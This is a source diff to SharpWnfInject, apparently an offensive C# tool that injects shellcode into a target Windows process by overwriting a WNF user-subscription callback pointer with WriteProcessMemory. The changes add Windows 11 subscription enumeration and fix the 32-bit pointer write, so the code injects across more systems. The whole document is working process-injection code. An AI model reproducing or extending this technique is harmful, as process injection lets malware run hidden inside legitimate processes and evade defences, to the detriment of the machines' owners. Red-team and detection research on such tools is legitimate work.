@@ -119,6 +119,8 @@ namespace SharpWnfInject.Library
             PeProcess proc;
             bool is64bit;
             ulong stateNameToInject = 0UL;
+            Dictionary<ulong, IntPtr> nameSubscriptions;
+            Dictionary<IntPtr, Dictionary<IntPtr, IntPtr>> userSubscriptions;
             Dictionary<IntPtr, IntPtr> callback;
             IntPtr pCallbackPointer;
             IntPtr pShellcode;
@@ -188,7 +190,7 @@ namespace SharpWnfInject.Library
 
             Console.WriteLine("[>] Trying to get WNF_NAME_SUBSCRIPTION(s).");
 
-            var nameSubscriptions = Utilities.GetNameSubscriptions(proc, pSubscriptionTable);
+            nameSubscriptions = Utilities.GetNameSubscriptions(proc, pSubscriptionTable);
 
             if (nameSubscriptions.Count == 0)
             {
@@ -239,7 +241,10 @@ namespace SharpWnfInject.Library
 
             Console.WriteLine("[>] Trying to get WNF_USER_SUBSCRIPTION(s) for the target WNF_NAME_SUBSCRIPTION.");
 
-            var userSubscriptions = Utilities.GetUserSubscriptions(proc, nameSubscriptions[stateNameToInject]);
+            if (Helpers.IsWin11())
+                userSubscriptions = Utilities.GetUserSubscriptionsWin11(proc, nameSubscriptions[stateNameToInject]);
+            else
+                userSubscriptions = Utilities.GetUserSubscriptions(proc, nameSubscriptions[stateNameToInject]);
 
             if (userSubscriptions.Count == 0)
             {
@@ -351,7 +356,7 @@ namespace SharpWnfInject.Library
             if (!Win32Api.WriteProcessMemory(
                     proc.GetProcessHandle(),
                     pCallbackPointer,
-                    BitConverter.GetBytes(pShellcode.ToInt64()),
+                    is64bit ? BitConverter.GetBytes(pShellcode.ToInt64()) : BitConverter.GetBytes(pShellcode.ToInt32()),
                     is64bit ? 8u: 4u,
                     IntPtr.Zero))
             {
